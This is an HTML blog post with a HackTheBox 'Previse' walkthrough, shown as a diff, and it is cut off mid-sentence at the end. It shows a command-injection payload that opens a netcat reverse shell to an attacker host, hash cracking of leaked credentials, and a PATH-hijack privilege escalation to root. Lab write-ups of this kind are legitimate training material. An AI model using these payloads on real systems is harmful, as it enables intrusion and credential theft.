@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Previse - HackTheBox Write-up :: The Red Bay</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Intro Hey all, as promised, I can now spend more time doing some HackTheBox machines since my CISSP studies are behind me and certification is done. Haven&amp;rsquo;t done any in a while so let&amp;rsquo;s kick it off with an easy one.
+This is a Linux based machine, easy, and going to be retired in a few weeks. It&amp;rsquo;s also m4lwhere&amp;rsquo;s first machine so this might be fresh and interesting.
+Before we dig in, this article won&amp;rsquo;t be as detailed as the others." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theredbay.net/infosec/htb/htb-previse/" />
+
+
+
+
+<link rel="stylesheet" href="https://theredbay.net/assets/style.css">
+
+  <link rel="stylesheet" href="https://theredbay.net/assets/red.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theredbay.net/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theredbay.net/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="redbay" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Previse - HackTheBox Write-up">
+<meta property="og:description" content="Write-up for the &#39;Previse&#39; box from HackTheBox.eu" />
+<meta property="og:url" content="https://theredbay.net/infosec/htb/htb-previse/" />
+<meta property="og:site_name" content="The Red Bay" />
+
+  
+    <meta property="og:image" content="https://theredbay.net/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-12-24 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    The Red Bay
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Menu ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/about">About</a></li>
+              
+            
+              
+                <li><a href="http://github.com/rebay1982">GitHub</a></li>
+              
+            
+              
+                <li><a href="/infosec">Infosec</a></li>
+              
+            
+              
+                <li><a href="/misc">Misc</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="http://github.com/rebay1982">GitHub</a></li>
+      
+    
+      
+        <li><a href="/infosec">Infosec</a></li>
+      
+    
+      
+        <li><a href="/misc">Misc</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theredbay.net/infosec/htb/htb-previse/">Previse - HackTheBox Write-up</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-12-24 
+      </span>
+    
+    
+    <span class="post-author">:: redbay</span>
+    
+  </div>
+
+  
+
+  
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-recon">Initial Recon</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#tldr">TL;DR</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <h1 id="intro">Intro<a href="#intro" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Hey all, as promised, I can now spend more time doing some HackTheBox machines since my CISSP
+studies are behind me and certification is done. Haven&rsquo;t done any in a while so let&rsquo;s kick it off
+with an easy one.</p>
+<p><img src="/img/htb-previse/infocard.png" alt=""></p>
+<p>This is a  Linux based machine, easy, and going to be retired in a few weeks. It&rsquo;s also <code>m4lwhere</code>&rsquo;s
+first machine so this might be fresh and interesting.</p>
+<p>Before we dig in, this article won&rsquo;t be as detailed as the others. The basics to resolve these
+easier machines have been covered in previous blog posts so for the sake of brevity, we won&rsquo;t deep
+dive in every single command or exploit. By now, it&rsquo;s assumed that the reader is doing their own
+research if something isn&rsquo;t clear or seems &ldquo;magical&rdquo;. Also, as always, for those in a serious hurry,
+see the <a href="#tldr">TL;DR</a> section at the very end.</p>
+<p>Without further due, let&rsquo;s dive in.</p>
+<h2 id="initial-recon">Initial Recon<a href="#initial-recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>We can add the IP address for the machine in an <code>/etc/hosts</code> entry for convenience&rsquo;s sake. This will
+do the trick</p>
+<pre tabindex="0"><code>sudo echo '10.10.11.104 previse.htb' &gt;&gt; /etc/hosts
+</code></pre><p>Following that, we&rsquo;re going port scan this machine to get an idea of the services running on it.</p>
+<pre tabindex="0"><code>$ sudo nmap -sS -Pn -T4 -A -p- previse.htb
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 11:07 EST
+Nmap scan report for 10.10.11.104
+Host is up (0.024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+| http-title: Previse Login
+|_Requested resource was login.php
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=12/23%OT=22%CT=1%CU=39777%PV=Y%DS=2%DC=T%G=Y%TM=61C49E
+OS:D9%P=x86_64-pc-linux-gnu)SEQ(SP=F1%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 199/tcp)
+HOP RTT      ADDRESS
+1   23.09 ms 10.10.14.1
+2   23.48 ms 10.10.11.104c
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.30 seconds
+</code></pre><p>Alright, we have port <code>22</code> (SSH) and <code>80</code> (HTTP) open. SSH is hinting that we will eventually have
+a password or a private key to log into the machine. HTTP is hinting that the main attack vector
+will be found through a flaw in the hosted web page. Let&rsquo;s start enumeration this host.</p>
+<h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>First things first, we will enumerate using <code>gobuster</code> and see if we can find something
+interesting hosted on the HTTP server.</p>
+<pre tabindex="0"><code>$ gobuster dir -u &quot;http://previse.htb/&quot; -w ../../tools/http-enum/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.104/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                ../../tools/http-enum/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/12/23 11:13:10 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.104/css/]
+/favicon.ico          (Status: 200) [Size: 15406]
+/index.php            (Status: 302) [Size: 2801] [--&gt; login.php]
+/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.104/js/]
+/server-status        (Status: 403) [Size: 277]
+
+===============================================================
+2021/12/23 11:13:23 Finished
+===============================================================
+</code></pre><p>There doesn&rsquo;t seem to be anything special but the <code>/index.php</code> page does raise an eyebrow. It seems
+to redirect to <code>/login.php</code>. Why redirect? Because of the HTTP status code response of
+<a href="https://en.wikipedia.org/wiki/HTTP_302"><code>302</code></a>.</p>
+<p>Using a web browser, this is what you will see by navigating to <code>http://previse.htb</code></p>
+<p><img src="/img/htb-previse/login.png" alt=""></p>
+<p>Since we&rsquo;re here, let&rsquo;s try a few easy login guesses. Using the <code>admin</code>, <code>administrator</code>, and <code>root</code>
+user names, we will try the  &ldquo;most common passwords of 2021&rdquo;.</p>
+<pre tabindex="0"><code>123456
+123456789
+qwerty
+password
+12345
+qwerty123
+1q2w3e
+12345678
+111111
+1234567890
+</code></pre><p>Well, nothing worked. <code>admin</code>, <code>password</code>, and <code>password!</code> all yield the same results. The source
+code of the <code>login.php</code> also doesn&rsquo;t give up much. Let&rsquo;s use <code>curl</code> to see what the <code>index.php</code> page
+looks like without it redirecting our browser to the <code>login.php</code> endpoint.</p>
+<pre tabindex="0"><code>curl http://previse.htb/index.php
+
+...
+
+&lt;nav class=&quot;uk-navbar-container&quot; uk-navbar&gt;
+    &lt;div class=&quot;uk-navbar-center&quot;&gt;
+        &lt;ul class=&quot;uk-navbar-nav&quot;&gt;
+            &lt;li class=&quot;uk-active&quot;&gt;&lt;a href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;
+                &lt;a href=&quot;accounts.php&quot;&gt;ACCOUNTS&lt;/a&gt;
+                &lt;div class=&quot;uk-navbar-dropdown&quot;&gt;
+                    &lt;ul class=&quot;uk-nav uk-navbar-dropdown-nav&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;accounts.php&quot;&gt;CREATE ACCOUNT&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/li&gt;
+            &lt;li&gt;&lt;a href=&quot;files.php&quot;&gt;FILES&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;
+                &lt;a href=&quot;status.php&quot;&gt;MANAGEMENT MENU&lt;/a&gt;
+                &lt;div class=&quot;uk-navbar-dropdown&quot;&gt;
+                    &lt;ul class=&quot;uk-nav uk-navbar-dropdown-nav&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;status.php&quot;&gt;WEBSITE STATUS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;file_logs.php&quot;&gt;LOG DATA&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/li&gt;
+            &lt;li&gt;&lt;a href=&quot;#&quot; class=&quot;.uk-text-uppercase&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;
+                &lt;a href=&quot;logout.php&quot;&gt;
+                    &lt;button class=&quot;uk-button uk-button-default uk-button-small&quot;&gt;LOG OUT&lt;/button&gt;
+                &lt;/a&gt;
+            &lt;/li&gt;
+        &lt;/ul&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+...
+
+</code></pre><p>Well, well, well. What&rsquo;s this? This page seems different to <code>login.php</code>, and it just gave us some
+information about other pages hosted on the server: <code>accounts.php</code>, <code>files.php</code>, <code>status.php</code>,
+<code>file_logs.php</code>, and <code>login.php</code>.</p>
+<p>Using the same <code>curl</code> command, we can fetch the <code>accounts.php</code> page and peruse its source code. It
+appears this page can be used to create user accounts through a <code>POST</code> request.</p>
+<pre tabindex="0"><code>...
+
+&lt;section class=&quot;uk-section uk-section-default&quot;&gt;
+    &lt;div class=&quot;uk-container&quot;&gt;
+        &lt;h2 class=&quot;uk-heading-divider&quot;&gt;Add New Account&lt;/h2&gt;
+        &lt;p&gt;Create new user.&lt;/p&gt;
+        &lt;p class=&quot;uk-alert-danger&quot;&gt;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!&lt;/p&gt;
+        &lt;p&gt;Usernames and passwords must be between 5 and 32 characters!&lt;/p&gt;
+    &lt;/p&gt;
+        &lt;form role=&quot;form&quot; method=&quot;post&quot; action=&quot;accounts.php&quot;&gt;
+            &lt;div class=&quot;uk-margin&quot;&gt;
+                &lt;div class=&quot;uk-inline&quot;&gt;
+                    &lt;span class=&quot;uk-form-icon&quot; uk-icon=&quot;icon: user&quot;&gt;&lt;/span&gt;
+                    &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;uk-input&quot; id=&quot;username&quot; placeholder=&quot;Username&quot;&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;uk-margin&quot;&gt;
+                &lt;div class=&quot;uk-inline&quot;&gt;
+                    &lt;span class=&quot;uk-form-icon&quot; uk-icon=&quot;icon: lock&quot;&gt;&lt;/span&gt;
+                    &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;uk-input&quot; id=&quot;password&quot; placeholder=&quot;Password&quot;&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;uk-margin&quot;&gt;
+                &lt;div class=&quot;uk-inline&quot;&gt;
+                    &lt;span class=&quot;uk-form-icon&quot; uk-icon=&quot;icon: lock&quot;&gt;&lt;/span&gt;
+                    &lt;input type=&quot;password&quot; name=&quot;confirm&quot; class=&quot;uk-input&quot; id=&quot;confirm&quot; placeholder=&quot;Confirm Password&quot;&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;button type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;uk-button uk-button-default&quot;&gt;CREATE USER&lt;/button&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/section&gt;
+...
+</code></pre><p>Bonus points, we have the minimal rules for usernames and passwords. Breaking this down, the
+<code>accounts.php</code> endpoint takes a <code>POST</code> request with <code>username</code>, <code>password</code>, and <code>confirm</code> parameters
+as input to create new user accounts. Using <code>curl</code>, this looks like this:</p>
+<pre tabindex="0"><code>$ curl -XPOST 'http://previse.htb/accounts.php' --data-raw 'username=redbay&amp;password=redbay&amp;confirm=redbay'
+</code></pre><p>We can go validate that it worked by browsing to the <code>login.php</code> and trying the new credentials.</p>
+<p><img src="/img/htb-previse/logged-in.png" alt=""></p>
+<p>Great! This confirms we&rsquo;re logged in! We now have some poking around to do. These things actually
+take time as it&rsquo;s not always as straight forward as we&rsquo;d like. This is what makes the whole thing
+fun and enjoyable. In the interest of time, let&rsquo;s go ahead and concentrate directly on the FILES
+section in the top menu.</p>
+<p>Someone seems to have left a <code>SITEBACKUP.ZIP</code> file under &ldquo;Uploaded Files&rdquo; (thanks <code>newguy</code>). These
+backup files are often of interest because they contain the source code of the whole site. This is
+a luxury we need to take advantage of &ndash; we&rsquo;re looking for programming mistakes that we can exploit
+to get a foothold or a reverse shell on the machine. Let&rsquo;s download and unzip the site backup file
+and see what we got. Luckily, there are no passwords protecting it.</p>
+<p>With regards to enumeration and sleuthing, we have gone though enough at this point. The key take
+aways are that it makes no sense to expose administrative API endpoints without authentication.
+Without being an administrator, we were able to create an account and log into the system.</p>
+<p>It goes without saying that it&rsquo;s obvious that leaving a site backup file exposed to any user is a
+bad idea. Web sites can contain configuration files that hold credentials used to connect to
+databases. Inadvertently exposing them this way can lead to some serious security issues.</p>
+<p>Anyway, now that we have access to the site&rsquo;s source code, let&rsquo;s see how we can leverage it to get a
+foothold on <code>Previse</code>.</p>
+<h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Fast forward 30 minutes, we find a few files of interest.</p>
+<p><code>config.php</code> is one.</p>
+<pre tabindex="0"><code>$ cat config.php
+&lt;?php
+
+function connectDB(){
+    $host = 'localhost';
+    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+    $mycon = new mysqli($host, $user, $passwd, $db);
+    return $mycon;
+}
+
+?&gt;
+</code></pre><p>Credentials. What were we just saying?  We also found a flaw in <code>logs.php</code>. Here&rsquo;s the code snippet
+of interest.</p>
+<pre tabindex="0"><code>  1 &lt;?php
+  2 session_start();
+  3 if (!isset($_SESSION['user'])) {
+  4     header('Location: login.php');
+  5     exit;
+  6 }
+  7 ?&gt;
+  8
+  9 &lt;?php
+ 10 if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
+ 11     header('Location: login.php');
+ 12     exit;
+ 13 }
+ 14
+ 15 /////////////////////////////////////////////////////////////////////////////////////
+ 16 //i tried really hard to parse the log delims in php, but python was so much easier//
+ 17 /////////////////////////////////////////////////////////////////////////////////////
+ 18
+ 19 $output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_post['delim']}&quot;);
+ 20 echo $output;
+ 
+</code></pre><p>Looking at the above code, we can observe that the <code>delim</code> <code>POST</code> request input parameter isn&rsquo;t
+validated or sanitized. We can essentially pass in anything we want through a <code>POST</code> request.
+Obviously this isn&rsquo;t what the developer intended but it is what we&rsquo;re going to leverage. We can
+insert an arbitrary command following the <code>log_process.py</code> command invocation by using a
+semi-column. Let&rsquo;s fire up a reverse shell using <code>netcat</code> and see what we get out of it.</p>
+<p>For this operation, we need to make sure we&rsquo;re logged in.</p>
+<pre tabindex="0"><code>$ curl -XPOST -c - 'http://previse.htb/login.php' --data-raw 'username=redbay&amp;password=redbay'
+
+...
+
+previse.htb     FALSE   /       FALSE   0       PHPSESSID       jg7bi95its9ketrfm5j2ht21q5
+
+</code></pre><p>The <code>-c</code> flag is for <code>curl</code> to output the returned cookie. This is necessary because the <code>logs.php</code>
+source code is expecting the user to be logged in for this operation to work. We need to pass the
+<code>PHPSESSID</code> along with our payload to the <code>logs.php</code> <code>POST</code> request.</p>
+<p>First, we have to setup our attack machine to receive incoming connections through <code>netcat</code> on port
+<code>4445</code>.</p>
+<pre tabindex="0"><code>nc -lvnp 4445
+</code></pre><p>Then, we can send our payload to the <code>Previse</code> machine.</p>
+<pre tabindex="0"><code>$ curl -XPOST 'http://previse.htb/logs.php' -H 'Cookie: PHPSESSID=jg7bi95its9ketrfm5j2ht21q5' --data-raw 'delim=space; nc &lt;attack ip&gt; 4445 -e /bin/bash'
+
+</code></pre><p>And BINGO! <code>Previse</code> connected back to our machine. We now have a reverse shell</p>
+<pre tabindex="0"><code>Connection from 10.10.11.104:49712
+whoami
+www-data
+</code></pre><p>From here, we&rsquo;ll need to do some more poking around to get access to the user account. We stumbled
+upon an unpriviledged account with limited access. We can&rsquo;t do much from here unforuntately. From
+what we already gathered, it feels like we&rsquo;ll be able to find a password or a way to log into
+<code>Previse</code> through SSH. Remember the <code>config.php</code> file we found earlier? It contains some credentials
+to connect to a database so that will be next on our to do list.</p>
+<h2 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Huge take away from the <code>config.php</code> file is the <code>$mycon = new mysql...</code> line. It hints at a <code>mysql</code>
+database. Before we proceed, we will want to &ldquo;upgrade&rdquo; our shell to a fully interactive TTY shell.</p>
+<pre tabindex="0"><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre><p>Once that&rsquo;s done, we can try to connect to the database. We&rsquo;re not guessing here, we&rsquo;re actually
+just using the information gleaned from the configuration file.</p>
+<pre tabindex="0"><code>mysql -h localhost -u root --password='mySQL_p@ssw0rd!:)' --database=previse
+
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 240
+Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt;
+</code></pre><p>You can list the databases using the following SQL query</p>
+<pre tabindex="0"><code>mysql&gt; select table_name, column_name from information_schema.columns where table_schema = 'previse';
++------------+-------------+
+| table_name | column_name |
++------------+-------------+
+| accounts   | id          |
+| accounts   | username    |
+| accounts   | password    |
+| accounts   | created_at  |
+| files      | id          |
+| files      | name        |
+| files      | size        |
+| files      | user        |
+| files      | data        |
+| files      | upload_time |
+| files      | protected   |
++------------+-------------+
+11 rows in set (0.00 sec)
+</code></pre><p>We&rsquo;re going to be interested in the <code>accounts</code> table &ndash; it has a <code>username</code> and a <code>password</code> column.</p>
+<pre tabindex="0"><code>mysql&gt; select * from accounts;
+select * from accounts;
++----+----------+------------------------------------+---------------------+
+| id | username | password                           | created_at          |
++----+----------+------------------------------------+---------------------+
+|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+|  2 | redbay   | $1$🧂llol$tCc4ufA6R5uOG87w7RQVZ. | 2021-12-24 02:33:27 |
++----+----------+------------------------------------+---------------------+
+</code></pre><p>And there you have it folks. Hashes for the <code>redbay</code> user we created earlier and a <code>m4lwhere</code> user.
+By looking at the password column, we gather that these are salted MD5 hashes. Salts are added to
+hashing functions to add to the randomization. This prevents the use of rainbow tables while
+attempting to crack the passwords. You can find some good information about salting hashes and what
+rainbow tables are <a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">here</a> and
+<a href="https://en.wikipedia.org/wiki/Rainbow_table">here</a>.</p>
+<p>This little operation will require a password cracking tool. <code>hashcat</code> in our case. The
+<code>RockYou.txt</code> word list is a go to word list for cracking passwords because it contains a long list
+of commonly used passwords. <code>hashcat</code> will hash the passwords in the list and compare them to the
+hashed values we picked up from the <code>accounts</code> table. If there is a match, it takes note of the
+password and moves on to the next one.</p>
+<p>First things first, we need to prepare the hashes for cracking. We can simply copy them as is to a
+text file we&rsquo;ll call <code>hashes</code>, one hash per line. <code>hashcat</code> will figure out the rest for us.</p>
+<p>We do have to specify a few parameters to get this to work. <code>hashcat --help</code> is our friend here and
+we&rsquo;ll leave it to the reader to figure out the parameter values.</p>
+<pre tabindex="0"><code>hashcat -a 0 -m 500 &lt;hash file&gt; &lt;wordlist&gt;
+
+Session..........: hashcat
+Status...........: Running
+Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+Hash.Target......: ./hashes
+Time.Started.....: Fri Dec 24 09:18:56 2021 (9 mins, 45 secs)
+Time.Estimated...: Fri Dec 24 09:42:22 2021 (13 mins, 41 secs)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    10200 H/s (0.07ms) @ Accel:1 Loops:1 Thr:64 Vec:1
+Recovered........: 1/2 (50.00%) Digests
+Progress.........: 5967360/14344384 (41.60%)
+Rejected.........: 0/5967360 (0.00%)
+Restore.Point....: 5967360/14344384 (41.60%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:860-861
+Candidates.#1....: luvujhen -&gt; luvp854eva
+Hardware.Mon.#1..: Util: 38% Core:1117MHz Mem:2250MHz Bus:16
+
+$1$≡ƒºéllol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
+</code></pre><p>where <code>&lt;hash file&gt;</code> is our text file containing the hashes and <code>&lt;wordlist&gt;</code> is the <code>RockYou.txt</code>
+word list. How long this takes heavily depends on the hardware you&rsquo;re using to crack the password
+hashes. In any case, we do have a result: <code>ilovecody112235!</code>. This would have been impossible to
+guess but we were able to acquire the password hashes. This enables us to crack them. Fortunately,
+the password the <code>m4lwhere</code> user used exists in the <code>RockYou.txt</code> word list. Have it not been in
+there, we would have needed a larger word list or we would have had to use a
+<a href="https://en.wikipedia.org/wiki/Brute-force_attack">brute force attack</a> to find the password. This
+would have been a lot more time consuming.</p>
+<p>In any case, we have a password. Let&rsquo;s give it a spin through SSH.</p>
+<pre tabindex="0"><code>$ ssh m4lwhere@10.10.11.104
+m4lwhere@10.10.11.104's password:
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Dec 25 23:11:04 UTC 2021
+
+  System load:  0.0               Processes:           251
+  Usage of /:   50.8% of 4.85GB   Users logged in:     0
+  Memory usage: 31%               IP address for eth0: 10.10.11.104
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Dec 25 21:26:41 2021 from 10.10.14.63
+m4lwhere@previse:~$ whoami
+m4lwhere
+m4lwhere@previse:~$ cat user.txt
+da0dd8c2dfe4a021e0c1203934932d34
+m4lwhere@previse:~$
+</code></pre><p>As simple as that. With access to hashes, it&rsquo;s only a matter of time before a password is cracked.
+One other best practice to point out here is to not reuse passwords. Obivously, had <code>m4lwhere</code> not
+used the same password on the system as the one for the file upload portal, we wouldn&rsquo;t have gotten
+access so easily.</p>
+<p>Let&rsquo;s now move on to <code>root</code>.</p>
+<h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Now that we have the password to the <code>m4lwhere</code>&rsquo;s user account, we should make a habit out of
+checking <code>sudo -l</code> before  enumerating the machine for privilege escalation. <code>sudo -l</code> lists the
+commands the user can run using <code>sudo</code>. These potentially contain privilege escalation vectors that
+can be easy to exploit. Let&rsquo;s see what we have.</p>
+<pre tabindex="0"><code>m4lwhere@previse:~$ sudo -l
+[sudo] password for m4lwhere:
+User m4lwhere may run the following commands on previse:
+    (root) /opt/scripts/access_backup.sh
+</code></pre><p>Interesting. So there seems to be a custom script that <code>m4lwhere</code> is allowed to execute using
+<code>sudo</code>. This doesn&rsquo;t seem much but let&rsquo;s go check it out &ndash; there might be a programming mistake
+similar to what we saw in <code>logs.php</code> that we can exploit.</p>
+<pre tabindex="0"><code>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
+#!/bin/bash
+
+# We always make sure to store logs, we take security SERIOUSLY here
+
+# I know I shouldnt run this as root but I cant figure it out programmatically on my account
+# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz
+</code></pre><p>Well, this is good news for us. The mistake here is that the developer didn&rsquo;t use absolute paths to
+reference executables. The shell will go through every entries of the <code>PATH</code>
+environement variable until it finds the command to execute. This means that if we have a command
+called <code>gzip</code> or <code>date</code> in a directory that is referenced by the <code>PATH</code> variable BEFORE the intended
+command (<code>/bin/gzip</code> and <code>/bin/date</code> in this case), we can have it execute as <code>root</code>.</p>
+<p>Let&rsquo;s leverage this. We&rsquo;re going to need to create an executable file in a directory that we have
+control over and have it run some custom code. We have two options here really: <code>gzip</code> and <code>date</code>.
+Let&rsquo;s just go with <code>gzip</code>. In the end, we&rsquo;re trying to get a shell as <code>root</code> so the obvious choice
+is to simply invoke <code>bash</code> from our executable file. We will need to tweak our <code>PATH</code> environment
+variable to make sure the script picks up our version of <code>gzip</code> and not the intended one found in
+<code>/bin/gzip</code>.</p>
+<p>Now that we kind of know the steps to do, let&rsquo;s give it a shot</p>
+<pre tabindex="0"><code>m4lwhere@previse:~$ echo &quot;/bin/bash 1&gt;&amp;2&quot; &gt; ./gzip
+m4lwhere@previse:~$ chmod 755 ./gzip
+m4lwhere@previse:~$ export PATH=./:$PATH
+m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
+root@previse:~# whoami
+root
+root@previse:~# cat /root/root.txt
+346883462c8bcc92aa4ccd12128874ce
+root@previse:~#
+</code></pre><p>Behold, the <code>root</code> flag! Everything is pretty straight forward but some might wonder why the
+redirect of <code>stdout</code> to <code>stderr</code>. In all honestly, some time was spent messing around with
+this. Omitting that redirect will give us a <code>root</code> shell but it will be impossible to actually see
